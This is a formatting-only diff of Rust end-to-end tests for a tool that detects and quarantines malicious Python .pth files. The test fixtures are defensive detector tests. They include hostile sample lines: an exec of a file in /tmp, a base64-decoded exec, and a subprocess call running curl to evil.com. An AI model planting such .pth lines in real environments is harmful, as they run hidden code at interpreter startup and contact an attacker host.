@@ -127,8 +127,7 @@ async fn e2e_full_attack_simulation() {
         entry.quarantine_path.exists(),
         "quarantined copy should exist"
     );
-    let quarantined_content =
-        fs::read_to_string(&entry.quarantine_path).expect("read quarantined");
+    let quarantined_content = fs::read_to_string(&entry.quarantine_path).expect("read quarantined");
     assert_eq!(quarantined_content, malicious_content);
 
     // Verify listing shows the quarantined item
@@ -178,7 +177,10 @@ async fn e2e_benign_pip_install_not_flagged() {
 
     // File should NOT be quarantined — it's still at the original path with original content
     let file_content = fs::read_to_string(&pth_path).expect("read");
-    assert_eq!(file_content, benign_content, "benign file should not be modified");
+    assert_eq!(
+        file_content, benign_content,
+        "benign file should not be modified"
+    );
 
     // Quarantine should be empty
     let entries = quarantine.list().expect("list");
@@ -210,10 +212,7 @@ async fn e2e_multiple_malicious_files_all_detected() {
 
     let payloads = [
         ("exec.pth", "exec(open('/tmp/payload.py').read())"),
-        (
-            "b64.pth",
-            "import base64;exec(base64.b64decode('payload'))",
-        ),
+        ("b64.pth", "import base64;exec(base64.b64decode('payload'))"),
         (
             "subprocess.pth",
             "import subprocess;subprocess.Popen(['curl','evil.com'])",
@@ -324,7 +323,9 @@ fn fixture_malicious_exec() {
         .flat_map(|l| l.reasons.iter().map(String::as_str))
         .collect();
     assert!(
-        all_reasons.iter().any(|r| r.contains("exec") || r.contains("compile")),
+        all_reasons
+            .iter()
+            .any(|r| r.contains("exec") || r.contains("compile")),
         "should detect exec/compile in malicious_exec.pth, got: {all_reasons:?}"
     );
 }
